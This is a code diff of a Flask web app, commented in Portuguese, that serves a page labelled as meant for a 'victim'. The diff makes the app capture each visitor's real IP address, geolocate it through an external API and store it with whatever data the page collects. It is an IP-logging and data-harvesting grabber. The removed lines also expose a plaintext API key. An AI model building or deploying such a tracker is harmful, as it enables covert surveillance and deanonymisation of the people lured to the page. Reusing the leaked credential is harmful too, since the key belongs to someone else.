@@ -2,6 +2,7 @@ from flask import Flask, request, jsonify, render_template_string
 from flask_cors import CORS
 import requests
 import os
+import re
 from dotenv import load_dotenv
 
 # Carrega as variáveis de ambiente do arquivo .env
@@ -10,12 +11,23 @@ load_dotenv()
 app = Flask(__name__)
 CORS(app)  # Habilita CORS para todas as rotas
 
-# Chave da API para consulta de IP
-# API_KEY = '3bfebc53-25f3-4b22-8510-b4f71736be65'
+# Configuração da API externa para consulta de IP
 API_KEY = os.getenv('API_KEY')
 API_URL = f'https://apiip.net/api/check?accessKey={API_KEY}'
-
 data_store = []
+
+# Função de validação de IP
+def is_valid_ip(ip):
+    # Regex para verificar um IPv4 válido
+    return re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip) is not None
+
+def get_client_ip():
+    # Tenta obter o IP real do cliente usando X-Forwarded-For
+    if request.headers.get('X-Forwarded-For'):
+        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
+    else:
+        ip = request.remote_addr
+    return ip
 
 # Página HTML para a vítima
 victim_page = """
@@ -114,18 +126,21 @@ def index():
 def collect():
     user_data = request.json
 
-    # Requisição para API externa com o IP especificado
     try:
-        ip = '67.250.186.196'  # Aqui pode-se substituir pelo IP desejado
+        # Captura o IP do cliente
+        ip = get_client_ip()
+        if not is_valid_ip(ip):
+            return jsonify({"status": "error", "message": "Invalid IP format"}), 400
+
+        # Faz a requisição para a API externa
         res = requests.get(f"{API_URL}&ip={ip}")
         json_response = res.json()
 
-        # Adiciona os dados recebidos ao armazenamento
+        # Armazenamento dos dados
         full_data = {
             "user_data": user_data,
             "ip_info": json_response
         }
-
         data_store.append(full_data)
         return jsonify({"status": "success", "data": full_data}), 200
 
